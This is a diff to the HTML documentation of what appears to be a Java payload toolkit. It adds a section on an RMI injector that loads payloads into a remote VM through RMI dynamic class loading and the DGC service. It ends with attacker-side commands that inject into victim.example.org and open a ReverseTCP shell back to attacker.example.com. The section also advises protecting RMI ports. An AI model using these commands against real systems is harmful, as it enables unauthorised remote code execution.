@@ -188,6 +188,7 @@ making it possible to connect a ReverseTCP stager directly to a JDWPTunnel stage
 <li>Add PollingTunnel stager as a generic in-process tunnelling method, by now supported by LocalTest and JDWPInjector.</li>
 <li>JarBuilder: Support custom applet class name</li>
 <li>Add ready event for stagers (like BindTCP) and stager handlers (like ReverseTCP) to make automated staging and injection more reliable.</li>
+<li>Add RMI injector to load payloads via RMI (rmiregistry, rmid, ...)</li>
 </ul>
 
 <h2>Changes since version 0.1</h2>
@@ -506,6 +507,41 @@ dynstager for a similar effect).</p>
 
 <p>The LocalStageMenu stage works similar to the StageMenu stage, only that it looks up stages from the
 class path, and it also supports custom command lines apart from those selectable from the menu.</p>
+
+<h3>RMI injector</h3>
+
+<p>RMI (Remote Method Invocation) is a protocol used to remotely invoke methods
+on exported objects on other machines. More than one object can be exported via
+the same RMI endpoint (IP + port). But regardless which objects you export yourself,
+the DGC service (distributed garbage collector) is exported in (as I think) all cases.
+When passing parameters to exported object that are not exported objects on the caller
+machine (those get marshalled), they will be serialized and later deserialized on the
+called machine. In case an object's class is not present on the called machine, it can
+be dynamically loaded from a Jar URL (that should be accessible to both the caller and
+the called VM) if not restricted by the RMI security manager (the default one does not).
+All of these are documented features of RMI, therefore there is no vulnerability involved
+to load a serializable class in the target VM and deserialize an instance of it. So,
+better protect your RMI ports from strangers (like you do with your JDWP ports).</p>
+
+<p>In Java 6, the JMX protocol was added to remotely monitor Java VMs. Basically, it is
+plain RMI, just that the exported object can enforce some extra authentication
+(username+password or certificate based). The authentication is only needed for the
+JMX service, not for the DGC service exported on the same endpoint. (Un-)Fortunately,
+unless the monitored application uses RMI itself, the JMX port will not allow loading
+classes dynamically, so JMX is only "vulnerable" in case the monitoed application uses
+RMI itself.</p>
+
+<p>The PollingTunnel stager is also supported with this injector; special precautions
+are taken to make sure the RMI object exported for it is exported on the same endpoint
+that was used for injecting the payload.</p>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java javapayload.builder.RMIInjector -buildjar rmi.jar</tt></p>
+<p>upload <tt>rmi.jar</tt> to a webserver accessible by both the attacker and the victim.</p>
+<p><tt>java javapayload.builder.RMIInjector http://public.example.org/rmi.jar victim.example.org 1099 ReverseTCP attacker.example.com # -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p><tt>rmiregistry</tt> or <tt>rmid</tt></p>
 
 </body>
 </html>
